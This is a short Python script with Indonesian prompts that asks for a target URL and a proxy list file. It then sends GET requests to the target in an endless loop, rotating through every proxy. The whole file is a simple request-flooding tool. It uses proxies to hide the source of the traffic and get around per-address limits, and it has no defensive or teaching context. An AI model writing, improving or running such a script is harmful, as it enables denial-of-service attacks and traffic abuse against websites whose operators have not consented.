#!/usr/bin/python
import time
import requests

url = input("Masukkan URL target: ")
proxy_file = input("Masukkan file proxy: ")

with open(proxy_file, 'r') as f:
    proxies = f.readlines()

while True:
    for proxy in proxies:
        proxy = proxy.strip()
        try:
            response = requests.get(url, proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}, timeout=5)
            print(f"Request sent via {proxy}")
        except Exception as e:
            print(f"Error: {e}")
    time.sleep(1)
